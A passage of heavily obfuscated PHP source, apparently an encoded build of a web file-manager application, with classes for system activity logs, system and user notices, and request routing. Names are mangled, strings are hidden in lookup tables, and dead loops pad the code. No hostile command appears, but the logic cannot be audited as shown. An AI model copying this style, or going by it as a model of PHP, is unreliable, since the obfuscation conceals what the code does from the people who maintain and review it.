$ÅæĞ‡—ç = $this->findByName($²¸³¿ğ¼); if (!$ÅæĞ‡—ç) { return !1; } return parent::remove($ÅæĞ‡—ç[$_SERVER[çâ¥×ø³][443]]); } public function add($Ÿ‚¥Øº½) { if ($this->findByName($Ÿ‚¥Øº½[$_SERVER[çâ¥×ø³][32]])) { return !1; } return parent::insert($Ÿ‚¥Øº½); } public function update($çù°¾­, $È÷­Ğøß) { $³ãĞ°È =& $_SERVER[çâ¥×ø³]; $ÔîÒÖ–ö = $this->findByName($çù°¾­); $±ù—¶š = $this->findByName($È÷­Ğøß[$³ãĞ°È[32]]); if (!$ÔîÒÖ–ö || $±ù—¶š && $±ù—¶š[$³ãĞ°È[443]] != $ÔîÒÖ–ö[$³ãĞ°È[443]]) { return !1; } return parent::update($ÔîÒÖ–ö[$³ãĞ°È[443]], $È÷­Ğøß); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\x73\x74\145\155\x5f\x6c\157\147"; protected $dataAuto = array(array("\143\x72\x65\x61\164\x65\x54\151\x6d\x65", "\x74\151\155\145", "\x69\x6e\163\145\162\x74", "\146\x75\156\x63\x74\151\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $à‡‰áµƒ =& $_SERVER[çâ¥×ø³]; return array($à‡‰áµƒ[2235] => LNG($à‡‰áµƒ[2236]), $à‡‰áµƒ[2237] => LNG($à‡‰áµƒ[2238]), $à‡‰áµƒ[1842] => LNG($à‡‰áµƒ[2239]), $à‡‰áµƒ[2240] => LNG($à‡‰áµƒ[2241]), $à‡‰áµƒ[2242] => LNG($à‡‰áµƒ[2243]), $à‡‰áµƒ[2244] => LNG($à‡‰áµƒ[2245]), $à‡‰áµƒ[2246] => LNG($à‡‰áµƒ[2247]), $à‡‰áµƒ[1872] => LNG($à‡‰áµƒ[2247]), $à‡‰áµƒ[1873] => LNG($à‡‰áµƒ[2248]), $à‡‰áµƒ[2249] => LNG($à‡‰áµƒ[2250]), $à‡‰áµƒ[2251] => LNG($à‡‰áµƒ[2252]), $à‡‰áµƒ[2253] => LNG($à‡‰áµƒ[2254]), $à‡‰áµƒ[2255] => LNG($à‡‰áµƒ[2256]), $à‡‰áµƒ[1870] => LNG($à‡‰áµƒ[2257]), $à‡‰áµƒ[2258] => LNG($à‡‰áµƒ[2259]), $à‡‰áµƒ[1877] => LNG($à‡‰áµƒ[2260]), $à‡‰áµƒ[2261] => LNG($à‡‰áµƒ[2262]), $à‡‰áµƒ[2263] => LNG($à‡‰áµƒ[2264]), $à‡‰áµƒ[2265] => LNG($à‡‰áµƒ[2266]), $à‡‰áµƒ[2267] => LNG($à‡‰áµƒ[2268]), $à‡‰áµƒ[1880] => LNG($à‡‰áµƒ[2269]), $à‡‰áµƒ[1881] => LNG($à‡‰áµƒ[2270]), $à‡‰áµƒ[2271] => LNG($à‡‰áµƒ[2272]), $à‡‰áµƒ[2273] => LNG($à‡‰áµƒ[2274]), $à‡‰áµƒ[2275] => LNG($à‡‰áµƒ[2276]), $à‡‰áµƒ[1875] => LNG($à‡‰áµƒ[2277]), $à‡‰áµƒ[2278] => LNG($à‡‰áµƒ[2279]), $à‡‰áµƒ[1874] => LNG($à‡‰áµƒ[2280]), $à‡‰áµƒ[2281] => LNG($à‡‰áµƒ[2282]), $à‡‰áµƒ[2283] => LNG($à‡‰áµƒ[2284]), $à‡‰áµƒ[2285] => LNG($à‡‰áµƒ[2286]), $à‡‰áµƒ[2287] => LNG($à‡‰áµƒ[2287]), $à‡‰áµƒ[2288] => LNG($à‡‰áµƒ[1846]), $à‡‰áµƒ[2289] => LNG($à‡‰áµƒ[2290]), $à‡‰áµƒ[2291] => LNG($à‡‰áµƒ[2292]), $à‡‰áµƒ[2293] => LNG($à‡‰áµƒ[2294]), $à‡‰áµƒ[2295] => LNG($à‡‰áµƒ[2296]), $à‡‰áµƒ[2297] => LNG($à‡‰áµƒ[2298]), $à‡‰áµƒ[2299] => LNG($à‡‰áµƒ[2299]), $à‡‰áµƒ[2300] => LNG($à‡‰áµƒ[2301]), $à‡‰áµƒ[2302] => LNG($à‡‰áµƒ[2303]), $à‡‰áµƒ[2304] => LNG($à‡‰áµƒ[2305]), $à‡‰áµƒ[2306] => LNG($à‡‰áµƒ[2307]), $à‡‰áµƒ[2308] => LNG($à‡‰áµƒ[2309]), $à‡‰áµƒ[2310] => LNG($à‡‰áµƒ[2311])); } private function typeFile() { $°¬€«ïÚ =& $_SERVER[çâ¥×ø³]; $ù€÷îè‘ = array($°¬€«ïÚ[1877] => array($°¬€«ïÚ[1878]), $°¬€«ïÚ[2253] => array($°¬€«ïÚ[2312]), $°¬€«ïÚ[2255] => array($°¬€«ïÚ[2313]), $°¬€«ïÚ[1870] => array($°¬€«ïÚ[1871], $°¬€«ïÚ[2314]), $°¬€«ïÚ[2263] => array(), $°¬€«ïÚ[2265] => array(), $°¬€«ïÚ[2267] => array(), $°¬€«ïÚ[1880] => array($°¬€«ïÚ[1882]), $°¬€«ïÚ[1881] => array($°¬€«ïÚ[1882]), $°¬€«ïÚ[2271] => array($°¬€«ïÚ[2315]), $°¬€«ïÚ[2273] => array($°¬€«ïÚ[2315]), $°¬€«ïÚ[2275] => array($°¬€«ïÚ[2316]), $°¬€«ïÚ[2261] => array($°¬€«ïÚ[2317]), $°¬€«ïÚ[1875] => array($°¬€«ïÚ[2318]), $°¬€«ïÚ[2278] => array($°¬€«ïÚ[2319]), $°¬€«ïÚ[1874] => array($°¬€«ïÚ[1876])); return $ù€÷îè‘; } private function typeAll() { $š‚íŒ†À =& $_SERVER[çâ¥×ø³]; $áŞ°¦˜® = $this->typeList; $Òä‹¸Ä‡ = array_filter($this->typeFile()); foreach ($Òä‹¸Ä‡ as $İëÉĞ“ => $Ì€ÆÓò) { $áŞ°¦˜®[$Ì€ÆÓò[0]] = $áŞ°¦˜®[$İëÉĞ“]; } $áŞ°¦˜®[$š‚íŒ†À[1882]] = LNG($š‚íŒ†À[2320]); $áŞ°¦˜®[$š‚íŒ†À[2315]] = LNG($š‚íŒ†À[2321]); return $áŞ°¦˜®; } public function addLog($ğ¶á‡ìÎ, $×¾ŒşÉß = array()) { $ĞêæÑ›“ =& $_SERVER[çâ¥×ø³]; if (!isset($this->typeList[$ğ¶á‡ìÎ])) { return; } $º÷¬ãëÏ = isset($×¾ŒşÉß[$ĞêæÑ›“[1701]]) ? $×¾ŒşÉß[$ĞêæÑ›“[1701]] : 0; if (!$º÷¬ãëÏ) { $º÷¬ãëÏ = Session::get($ĞêæÑ›“[2036]); } if ($ğ¶á‡ìÎ == $ĞêæÑ›“[2289] && is_array($×¾ŒşÉß[$ĞêæÑ›“[2322]]) && !$×¾ŒşÉß[$ĞêæÑ›“[2322]]) { return; } $Êé«‚ = get_client_ip(); if (!$×¾ŒşÉß || strlen(json_encode($×¾ŒşÉß)) >= 1024) { $×¾ŒşÉß = array($ĞêæÑ›“[2323] => $Êé«‚); } else { if (is_array($×¾ŒşÉß)) { $×¾ŒşÉß[$ĞêæÑ›“[2323]] = $Êé«‚; } else { $×¾ŒşÉß = array($ĞêæÑ›“[1255] => $×¾ŒşÉß, $ĞêæÑ›“[2323] => $Êé«‚); } } $×¾ŒşÉß = array($ĞêæÑ›“[1691] => Session::sign(), $ĞêæÑ›“[1692] => intval($º÷¬ãëÏ), $ĞêæÑ›“[33] => $ğ¶á‡ìÎ, $ĞêæÑ›“[1694] => json_encode($×¾ŒşÉß)); parent::add($×¾ŒşÉß); } public function remove($øÊ´†Çé) { $this->where(array($_SERVER[çâ¥×ø³][461] => $øÊ´†Çé))->delete(); } private function _makeOrder($é„ÚåµŞ = '') { $âÕÇåé× =& $_SERVER[çâ¥×ø³]; $ùù¬œÑ = $âÕÇåé×[215]; $ŠäÓÅÕ‡ = array($âÕÇåé×[491] => $âÕÇåé×[492], $âÕÇåé×[493] => $âÕÇåé×[494]); $˜É—çŒ = Input::get($âÕÇåé×[499], $âÕÇåé×[7], $âÕÇåé×[2072], array($âÕÇåé×[1990], $âÕÇåé×[493])); $˜É—çŒ = $ŠäÓÅÕ‡[$˜É—çŒ]; $é„ÚåµŞ = $é„ÚåµŞ . "{$ùù¬œÑ}\x20{$˜É—çŒ}"; return $this->order($é„ÚåµŞ); } public function get($Ìï¡ı¢ = '') { $ù¶Å¡Ì =& $_SERVER[çâ¥×ø³]; if (!$Ìï¡ı¢) { show_json(array()); } $ÍÓÉ­ùÑ = array(); if ($Ìï¡ı¢[$ù¶Å¡Ì[1701]]) { $ÍÓÉ­ùÑ[$ù¶Å¡Ì[1701]] = $Ìï¡ı¢[$ù¶Å¡Ì[1701]]; } if (isset($Ìï¡ı¢[$ù¶Å¡Ì[809]])) { $Ãø‰Å‡Õ = $Ìï¡ı¢[$ù¶Å¡Ì[809]]; $ºÃú×ÅÃ = isset($Ìï¡ı¢[$ù¶Å¡Ì[810]]) ? $Ìï¡ı¢[$ù¶Å¡Ì[810]] : time(); $ÍÓÉ­ùÑ[$ù¶Å¡Ì[215]] = array($ù¶Å¡Ì[377], array($Ãø‰Å‡Õ, $ºÃú×ÅÃ)); } if ($Ìï¡ı¢[$ù¶Å¡Ì[33]]) { $ÅĞÏ¯„× = explode($ù¶Å¡Ì[50], $Ìï¡ı¢[$ù¶Å¡Ì[33]]); $³Š¿‘ = $this->typeFile(); $™Áã‡ÀÌ = array(); foreach ($ÅĞÏ¯„× as $õ¢ ŒÕ¡) { $™Áã‡ÀÌ[] = $õ¢ ŒÕ¡; if (isset($³Š¿‘[$õ¢ ŒÕ¡])) { $™Áã‡ÀÌ = array_merge($™Áã‡ÀÌ, $³Š¿‘[$õ¢ ŒÕ¡]); } } $™Áã‡ÀÌ = array_unique($™Áã‡ÀÌ); if ($™Áã‡ÀÌ) { $ÍÓÉ­ùÑ[$ù¶Å¡Ì[33]] = array($ù¶Å¡Ì[7], $™Áã‡ÀÌ); } } else { $ÍÓÉ­ùÑ[$ù¶Å¡Ì[33]] = array($ù¶Å¡Ì[2324], $ù¶Å¡Ì[2325]); } if (!empty($Ìï¡ı¢[$ù¶Å¡Ì[2323]])) { $ÍÓÉ­ùÑ[$ù¶Å¡Ì[494]] = array($ù¶Å¡Ì[427], "\45{$Ìï¡ı¢[$ù¶Å¡Ì[2323]]}\x25"); } $úå¤öÄ = $this->_makeOrder()->where($ÍÓÉ­ùÑ)->selectPage(); if (empty($úå¤öÄ[$ù¶Å¡Ì[413]])) { show_json(array(), !0, $úå¤öÄ[$ù¶Å¡Ì[410]]); } $úå¤öÄ[$ù¶Å¡Ì[413]] = $this->logList($úå¤öÄ[$ù¶Å¡Ì[413]]); return $úå¤öÄ; } private function ipAddress(&$”ËáØıÙ) { $Ô½ñúØ =& $_SERVER[çâ¥×ø³]; if (!empty($”ËáØıÙ[$Ô½ñúØ[2323]])) { $µ¬äµğ† = IpLocation::get($”ËáØıÙ[$Ô½ñúØ[2323]]); } else { $µ¬äµğ† = LNG($Ô½ñúØ[2326]); } $”ËáØıÙ[$Ô½ñúØ[2327]] = $µ¬äµğ†; } private function descZipDownload($¹¾ßìÁÑ, &$ó˜ƒÛû¢) { $³ÒÕêì‚ =& $_SERVER[çâ¥×ø³]; if (!isset($¹¾ßìÁÑ[$³ÒÕêì‚[2328]])) { return; } $¢ı©¸Ğ¢ = json_decode($¹¾ßìÁÑ[$³ÒÕêì‚[2328]], !0); foreach ($¢ı©¸Ğ¢ as $äŠ™÷çŞ) { try { $ßàÅÔ  = IO::infoFullSimple($äŠ™÷çŞ[$³ÒÕêì‚[84]]); } catch (Exception $ÙØÅÉê‰) { continue; } $¹¾ßìÁÑ[$³ÒÕêì‚[84]] = $äŠ™÷çŞ[$³ÒÕêì‚[84]]; $ó˜ƒÛû¢[] = $¹¾ßìÁÑ[$³ÒÕêì‚[181]] = $ßàÅÔ [$³ÒÕêì‚[181]]; $ó˜ƒÛû¢[] = $¹¾ßìÁÑ[$³ÒÕêì‚[2127]] = $ßàÅÔ [$³ÒÕêì‚[180]]; break; } return $¹¾ßìÁÑ; } private function getSourceList(&$æó†ª±) { $Œï¸—Ó‚ =& $_SERVER[çâ¥×ø³]; $ˆÒ¥‹¥© = array(); foreach ($æó†ª± as $„ºáÑÉ‘ => $¥¡ğùİ) { $ÍÇ£ÏÕ† = json_decode($¥¡ğùİ[$Œï¸—Ó‚[494]], !0); if ($¥¡ğùİ[$Œï¸—Ó‚[33]] == $Œï¸—Ó‚[1873]) { $ÍÇ£ÏÕ† = $this->descZipDownload($ÍÇ£ÏÕ†, $ˆÒ¥‹¥©); $æó†ª±[$„ºáÑÉ‘][$Œï¸—Ó‚[494]] = json_encode($ÍÇ£ÏÕ†); continue; } if (strpos($¥¡ğùİ[$Œï¸—Ó‚[33]], $Œï¸—Ó‚[2129]) !== 0) { if (!isset($ÍÇ£ÏÕ†[$Œï¸—Ó‚[84]]) || strpos($¥¡ğùİ[$Œï¸—Ó‚[33]], $Œï¸—Ó‚[2329]) !== 0) { continue; } try { $åÅÙº›è = IO::infoFullSimple($ÍÇ£ÏÕ†[$Œï¸—Ó‚[84]]); } catch (Exception $ñŞ³ÇÒÉ) { continue; } $ˆÒ¥‹¥©[] = $ÍÇ£ÏÕ†[$Œï¸—Ó‚[181]] = $åÅÙº›è[$Œï¸—Ó‚[181]]; $ˆÒ¥‹¥©[] = $ÍÇ£ÏÕ†[$Œï¸—Ó‚[2127]] = $åÅÙº›è[$Œï¸—Ó‚[180]]; $æó†ª±[$„ºáÑÉ‘][$Œï¸—Ó‚[494]] = json_encode($ÍÇ£ÏÕ†); continue; } $ˆÒ¥‹¥©[] = $ÍÇ£ÏÕ†[$Œï¸—Ó‚[181]]; $ˆÒ¥‹¥©[] = $ÍÇ£ÏÕ†[$Œï¸—Ó‚[2127]]; if ($ÍÇ£ÏÕ†[$Œï¸—Ó‚[33]] == $Œï¸—Ó‚[588]) { $ˆÒ¥‹¥©[] = $ÍÇ£ÏÕ†[$Œï¸—Ó‚[494]][$Œï¸—Ó‚[1213]]; $ˆÒ¥‹¥©[] = $ÍÇ£ÏÕ†[$Œï¸—Ó‚[494]][$Œï¸—Ó‚[1214]]; } if ($ÍÇ£ÏÕ†[$Œï¸—Ó‚[33]] == $Œï¸—Ó‚[2137]) { $ˆÒ¥‹¥©[] = $ÍÇ£ÏÕ†[$Œï¸—Ó‚[494]][$Œï¸—Ó‚[181]]; } } if (!$ˆÒ¥‹¥©) { return array(); } return Model($Œï¸—Ó‚[874])->sourceListInfo($ˆÒ¥‹¥©, !0); } private function logList($ëÓœß«£) { $Ã§Ò®›ä =& $_SERVER[çâ¥×ø³]; $Óôüâá = array_to_keyvalue($ëÓœß«£, $Ã§Ò®›ä[12], $Ã§Ò®›ä[1701]); $éïÊ¶ÖÈ = Model($Ã§Ò®›ä[567])->userListInfo(array_unique($Óôüâá)); $ÚÙË¿ = $this->getSourceList($ëÓœß«£); $ŠÏ†¨¯Ş = $this->typeAll(); $°ÆÇÏ‡¡ = array(); $ıÆ¢‡·Ä = array(); foreach ($ëÓœß«£ as $¤ªîÏõÆ => $„©“³‘¦) { $Ü•ØÕ¦  = $„©“³‘¦[$Ã§Ò®›ä[33]]; $‡‰—áÓ× = isset($éïÊ¶ÖÈ[$„©“³‘¦[$Ã§Ò®›ä[1701]]]) ? $éïÊ¶ÖÈ[$„©“³‘¦[$Ã§Ò®›ä[1701]]] : !1; $³ÆèÃöğ = strpos($Ü•ØÕ¦ , $Ã§Ò®›ä[2330]) === 0 ? LNG($Ã§Ò®›ä[2331]) : LNG($Ã§Ò®›ä[2326]); $„©“³‘¦[$Ã§Ò®›ä[32]] = isset($‡‰—áÓ×[$Ã§Ò®›ä[32]]) ? $‡‰—áÓ×[$Ã§Ò®›ä[32]] : LNG($Ã§Ò®›ä[2326]); $„©“³‘¦[$Ã§Ò®›ä[2181]] = isset($‡‰—áÓ×[$Ã§Ò®›ä[2181]]) ? $‡‰—áÓ×[$Ã§Ò®›ä[2181]] : $Ã§Ò®›ä[12]; $„©“³‘¦[$Ã§Ò®›ä[1598]] = isset($ŠÏ†¨¯Ş[$Ü•ØÕ¦ ]) ? $ŠÏ†¨¯Ş[$Ü•ØÕ¦ ] : $³ÆèÃöğ; $„©“³‘¦[$Ã§Ò®›ä[2071]] = $‡‰—áÓ×; $ØÃÉüâ = json_decode($„©“³‘¦[$Ã§Ò®›ä[494]], !0); $„©“³‘¦[$Ã§Ò®›ä[2323]] = isset($ØÃÉüâ[$Ã§Ò®›ä[2323]]) ? $ØÃÉüâ[$Ã§Ò®›ä[2323]] : $Ã§Ò®›ä[12]; $„©“³‘¦[$Ã§Ò®›ä[2327]] = IpLocation::get($„©“³‘¦[$Ã§Ò®›ä[2323]]); if (strpos($Ü•ØÕ¦ , $Ã§Ò®›ä[2129]) === 0 || isset($ØÃÉüâ[$Ã§Ò®›ä[2127]])) { $ØÃÉüâ[$Ã§Ò®›ä[87]] = $ÚÙË¿[$ØÃÉüâ[$Ã§Ò®›ä[181]]]; $ØÃÉüâ[$Ã§Ò®›ä[2142]] = $ÚÙË¿[$ØÃÉüâ[$Ã§Ò®›ä[2127]]]; if ($ØÃÉüâ[$Ã§Ò®›ä[33]] == $Ã§Ò®›ä[588]) { $ØÃÉüâ[$Ã§Ò®›ä[494]][$Ã§Ò®›ä[1213]] = $ÚÙË¿[$ØÃÉüâ[$Ã§Ò®›ä[494]][$Ã§Ò®›ä[1213]]]; $ØÃÉüâ[$Ã§Ò®›ä[494]][$Ã§Ò®›ä[1214]] = $ÚÙË¿[$ØÃÉüâ[$Ã§Ò®›ä[494]][$Ã§Ò®›ä[1214]]]; } if ($ØÃÉüâ[$Ã§Ò®›ä[33]] == $Ã§Ò®›ä[2137]) { $ØÃÉüâ[$Ã§Ò®›ä[494]][$Ã§Ò®›ä[181]] = $ÚÙË¿[$ØÃÉüâ[$Ã§Ò®›ä[494]][$Ã§Ò®›ä[181]]]; } if ($ØÃÉüâ[$Ã§Ò®›ä[33]] == $Ã§Ò®›ä[1868]) { $ØÃÉüâ[$Ã§Ò®›ä[2142]] = $ØÃÉüâ[$Ã§Ò®›ä[87]]; $ØÃÉüâ[$Ã§Ò®›ä[2127]] = $ØÃÉüâ[$Ã§Ò®›ä[2142]][$Ã§Ò®›ä[181]]; $ØÃÉüâ[$Ã§Ò®›ä[87]] = !1; $ØÃÉüâ[$Ã§Ò®›ä[181]] = $Ã§Ò®›ä[12]; } if ($ØÃÉüâ[$Ã§Ò®›ä[87]] && $ØÃÉüâ[$Ã§Ò®›ä[87]][$Ã§Ò®›ä[178]] == $Ã§Ò®›ä[179]) { $ıÆ¢‡·Ä[] = $„©“³‘¦[$Ã§Ò®›ä[443]]; unset($ëÓœß«£[$¤ªîÏõÆ]); continue; } if ($ØÃÉüâ[$Ã§Ò®›ä[2142]] && $ØÃÉüâ[$Ã§Ò®›ä[2142]][$Ã§Ò®›ä[178]] == $Ã§Ò®›ä[179]) { $ıÆ¢‡·Ä[] = $„©“³‘¦[$Ã§Ò®›ä[443]]; unset($ëÓœß«£[$¤ªîÏõÆ]); continue; } } $„©“³‘¦[$Ã§Ò®›ä[494]] = $ØÃÉüâ; unset($„©“³‘¦[$Ã§Ò®›ä[2332]]); $°ÆÇÏ‡¡[] = $„©“³‘¦; } $this->clearSystemPathLog($ıÆ¢‡·Ä); return $°ÆÇÏ‡¡; } private function clearSystemPathLog($£ÒÈÕí) { $³áúëô¨ =& $_SERVER[çâ¥×ø³]; if (count($£ÒÈÕí) == 0) { return; } $ŠÚİÅŞí = array($³áúëô¨[443] => array($³áúëô¨[7], array_unique($£ÒÈÕí))); $this->where($ŠÚİÅŞí)->delete(); } public function deviceList($š“áî„Œ, $¢š º‚à = 0) { $ı”­öÁ =& $_SERVER[çâ¥×ø³]; $Ëğ•»şí = array($ı”­öÁ[1701] => $š“áî„Œ, $ı”­öÁ[215] => array($ı”­öÁ[1067], $¢š º‚à), $ı”­öÁ[33] => $ı”­öÁ[1842]); $—ˆ‹œ§ß = array(); $—ï§§İ¶ = $this->field($ı”­öÁ[2333])->where($Ëğ•»şí)->order($ı”­öÁ[2140])->limit(50)->select(); foreach ($—ï§§İ¶ as $ü÷—Ù³ => $üª‚Ïç‡) { if ($ü÷—Ù³ > 0 && abs($üª‚Ïç‡[$ı”­öÁ[215]] - $—ï§§İ¶[$ü÷—Ù³ - 1][$ı”­öÁ[215]]) < 5) { continue; } $“¿®›ø = json_decode($üª‚Ïç‡[$ı”­öÁ[494]], !0); $üª‚Ïç‡[$ı”­öÁ[2323]] = isset($“¿®›ø[$ı”­öÁ[2323]]) ? $“¿®›ø[$ı”­öÁ[2323]] : $ı”­öÁ[12]; unset($“¿®›ø[$ı”­öÁ[2323]]); $ˆüº´”µ = $this->deviceType($“¿®›ø[$ı”­öÁ[2130]]); if (isset($—ˆ‹œ§ß[$ˆüº´”µ])) { continue; } $üª‚Ïç‡[$ı”­öÁ[2327]] = IpLocation::get($üª‚Ïç‡[$ı”­öÁ[2323]]); $üª‚Ïç‡[$ı”­öÁ[494]] = $“¿®›ø; $—ˆ‹œ§ß[$ˆüº´”µ] = $üª‚Ïç‡; } return array_values($—ˆ‹œ§ß); } public function deviceType($¼ğÔ›ÎÜ) { return $¼ğÔ›ÎÜ; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\x6d\56\x6e\157\164\x69\x63\x65\x4c\151\x73\x74"; public $field = array("\x6e\x61\x6d\145", "\143\157\x6e\164\x65\156\x74", "\141\165\164\x68", "\155\x6f\144\x65", "\164\x69\155\x65", "\x74\x79\160\145", "\154\x65\166\x65\x6c", "\x65\x6e\x61\x62\x6c\x65", "\163\157\162\x74"); public function listData($§¦Ê†– = false, $øøÏÈÎÏ = "\163\157\162\x74", $şµû–§½ = false) { return parent::listData($§¦Ê†–, $øøÏÈÎÏ, $şµû–§½); } public function add($˜±‹‡ø‹) { $Š„–ïŠ =& $_SERVER[çâ¥×ø³]; $²ÑøÈß = time(); if ($˜±‹‡ø‹[$Š„–ïŠ[16]] == $Š„–ïŠ[2334]) { $²ÑøÈß = strtotime($˜±‹‡ø‹[$Š„–ïŠ[194]]); } $˜±‹‡ø‹[$Š„–ïŠ[194]] = $²ÑøÈß; return parent::insert($˜±‹‡ø‹); } public function update($ÏàÒı«, $Íâ¬Íñ•) { $î¢ì£ç· =& $_SERVER[çâ¥×ø³]; $¸ÓŸŒ¦² = $this->listData($ÏàÒı«); if (!$¸ÓŸŒ¦²) { return !1; } $¾ò‚›ö = time(); if ($Íâ¬Íñ•[$î¢ì£ç·[16]] == $î¢ì£ç·[2334]) { $¾ò‚›ö = strtotime($Íâ¬Íñ•[$î¢ì£ç·[194]]); } $Íâ¬Íñ•[$î¢ì£ç·[194]] = $¾ò‚›ö; return parent::update($ÏàÒı«, $Íâ¬Íñ•); } public function remove($‚©Şê¤’) { $‘²«Ğ˜À = $this->listData($‚©Şê¤’); if (!$‘²«Ğ˜À || $‘²«Ğ˜À[$_SERVER[çâ¥×ø³][179]]) { return !1; } return parent::remove($‚©Şê¤’); } public function sort($µé•İÑ’, $¿Ñíüæ‰) { return parent::update($µé•İÑ’, $¿Ñíüæ‰); } public function enable($¶Ï×»ì, $‘ÔØşò) { return parent::update($¶Ï×»ì, array($_SERVER[çâ¥×ø³][2335] => $‘ÔØşò)); } private function initUserOption() { $è…ÄËŸ =& $_SERVER[çâ¥×ø³]; $this->optionType = $è…ÄËŸ[2336]; $this->modelType = $è…ÄËŸ[2337]; $this->field = array($è…ÄËŸ[2338], $è…ÄËŸ[32], $è…ÄËŸ[194], $è…ÄËŸ[33], $è…ÄËŸ[2339], $è…ÄËŸ[799], $è…ÄËŸ[210]); } public function userNoticeGet($ÚşÇ·¨÷ = false) { $this->initUserOption(); return parent::listData($ÚşÇ·¨÷, $_SERVER[çâ¥×ø³][443], !0); } public function userNoticeAdd($à©½ç“ƒ) { $ßîç¿š =& $_SERVER[çâ¥×ø³]; $this->initUserOption(); $úÚˆø¥® = $this->findByKey($ßîç¿š[2338], $à©½ç“ƒ[$ßîç¿š[443]]); if ($úÚˆø¥®) { return !0; } $ü—Áıô = array($ßîç¿š[2338] => $à©½ç“ƒ[$ßîç¿š[443]], $ßîç¿š[32] => $à©½ç“ƒ[$ßîç¿š[32]], $ßîç¿š[194] => $à©½ç“ƒ[$ßîç¿š[194]], $ßîç¿š[33] => isset($à©½ç“ƒ[$ßîç¿š[33]]) ? $à©½ç“ƒ[$ßîç¿š[33]] : 1, $ßîç¿š[2339] => isset($à©½ç“ƒ[$ßîç¿š[2339]]) ? $à©½ç“ƒ[$ßîç¿š[2339]] : 0, $ßîç¿š[799] => 0, $ßîç¿š[210] => 0); return parent::insert($ü—Áıô); } public function userNoticeEdit($­ÚÃ±—¾, $¶™á»­Å) { $this->initUserOption(); return parent::update($­ÚÃ±—¾, $¶™á»­Å); } } goto b¢—ë·Ü¥÷; bËóª½ß‰: class Application { private $defaultModule = "\151\x6e\144\x65\170"; private $defaultController = "\x69\156\144\x65\x78"; private $defaultAction = "\x69\x6e\x64\x65\x78"; function __construct() { } public function setDefault($›ÁÛÔ£Ñ) { $È‚»Ó°° =& $_SERVER[çâ¥×ø³]; $è˜íªÓ =& $_SERVER[ĞİŞñ©]; $€İ€²é© = explode($è˜íªÓ[0], trim($›ÁÛÔ£Ñ, $è˜íªÓ[0])); $˜šÏÙ·ï = $È‚»Ó°°[652]; while (strlen($˜šÏÙ·ï) < $È‚»Ó°°[653]) { if (!$˜šÏÙ·ï) { break; } $˜šÏÙ·ï++; } $this->defaultModule = $€İ€²é©[0] ? $€İ€²é©[0] : $this->defaultModule; $ïÔ•úÃ» = $È‚»Ó°°[654]; if (strlen($ïÔ•úÃ») < $È‚»Ó°°[655]) { return; } $this->defaultController = $€İ€²é©[1] ? $€İ€²é©[1] : $this->defaultController; $this->defaultAction = $€İ€²é©[2] ? $€İ€²é©[2] : $this->defaultAction; $”ÃÖ–ıë = $È‚»Ó°°[656]; if (strlen($”ÃÖ–ıë) < $È‚»Ó°°[657]) { return; } $this->wqyz434aa756($è˜íªÓ[1], array($this, $è˜íªÓ[2])); } public function appRun($õª¿ÈÃ) { $„´– ¾û =& $_SERVER[çâ¥×ø³]; $ÜâµåÙÃ =& $_SERVER[ĞİŞñ©]; $·ÅŞ‘®’ = explode($ÜâµåÙÃ[0], $õª¿ÈÃ); $ÉßŸÒÛ = strtolower($·ÅŞ‘®’[0]); $¤Œ‹ä·õ = $„´– ¾û[658]; $ÉÍê‹âÛ = $ÜâµåÙÃ[3]; $ôÄ¸¤È¦ = $„´– ¾û[659]; while ($ôÄ¸¤È¦ < $„´– ¾û[660]) { if ($ôÄ¸¤È¦ >= 0) { break; } $ôÄ¸¤È¦++; } if ($ÉßŸÒÛ == $ÜâµåÙÃ[4]) { $ÉÍê‹âÛ = $ÜâµåÙÃ[5]; $·ÅŞ‘®’[0] = $ÜâµåÙÃ[6]; $·ÅŞ‘®’[1] = $·ÅŞ‘®’[1] . $ÜâµåÙÃ[7]; $õª¿ÈÃ = join($ÜâµåÙÃ[0], $·ÅŞ‘®’); $õª¿ÈÃ = trim($õª¿ÈÃ, $ÜâµåÙÃ[0]); } call_user_func(array($ÜâµåÙÃ[8], $ÜâµåÙÃ[9]), $ÉÍê‹âÛ . $ÜâµåÙÃ[10], $õª¿ÈÃ); ActionCall($õª¿ÈÃ); $¸ÉÚ›Ùè = $„´– ¾û[661]; while ($¸ÉÚ›Ùè < $„´– ¾û[657]) { if ($¸ÉÚ›Ùè >= 0) { break; } $¸ÉÚ›Ùè++; } call_user_func(array($ÜâµåÙÃ[8], $ÜâµåÙÃ[9]), $ÉÍê‹âÛ . $ÜâµåÙÃ[11], $õª¿ÈÃ); } private function autorun() { $íªû…½Ò =& $_SERVER[ĞİŞñ©]; global $config; if (count($config[$íªû…½Ò[12]]) == 0) { return; } foreach ($config[$íªû…½Ò[12]] as $±¿ÇÇà„ => $‰›ÃÀ­) { $this->appRun($‰›ÃÀ­); $´º±Ë½å = $_SERVER[çâ¥×ø³][662]; } } private function zwbk6a06768f() { $Ñ‹­ÛÚæ =& $_SERVER[çâ¥×ø³]; $¼‘Íì =& $_SERVER[ĞİŞñ©]; $«ßµ„² = $¼‘Íì[4]; $ÃœŠºõ¸ = $Ñ‹­ÛÚæ[663]; if (!$ÃœŠºõ¸) { die; } $õá”‰¼ˆ = $GLOBALS[$¼‘Íì[13]][$¼‘Íì[14]][0]; $‘ƒáËÜ° = $Ñ‹­ÛÚæ[664]; if (strlen($‘ƒáËÜ°) < $Ñ‹­ÛÚæ[660]) { return; } if (!$õá”‰¼ˆ || strlen($õá”‰¼ˆ) <= strlen($«ßµ„²)) { return; } if (strtolower(substr($õá”‰¼ˆ, -strlen($«ßµ„²))) != $«ßµ„²) { return; } $³ÏÎ¢»È = substr($õá”‰¼ˆ, 0, -strlen($«ßµ„²)); $ŸúÊ£Úã = $Ñ‹­ÛÚæ[665]; if (!$ŸúÊ£Úã) { return; } $‰‚²ôŒÀ = array($¼‘Íì[4], $³ÏÎ¢»È); $ğÈ¤Ğ´æ = array_slice($GLOBALS[$¼‘Íì[13]][$¼‘Íì[14]], 1); $Ò‡ÙÇ† = $Ñ‹­ÛÚæ[666]; while (strlen($Ò‡ÙÇ†) < $Ñ‹­ÛÚæ[655]) { if (!$Ò‡ÙÇ†) { break; } $Ò‡ÙÇ†++; } $GLOBALS[$¼‘Íì[13]][$¼‘Íì[14]] = array_merge($‰‚²ôŒÀ, $ğÈ¤Ğ´æ); $GLOBALS[$¼‘Íì[13]][$¼‘Íì[15]] = implode($¼‘Íì[0], 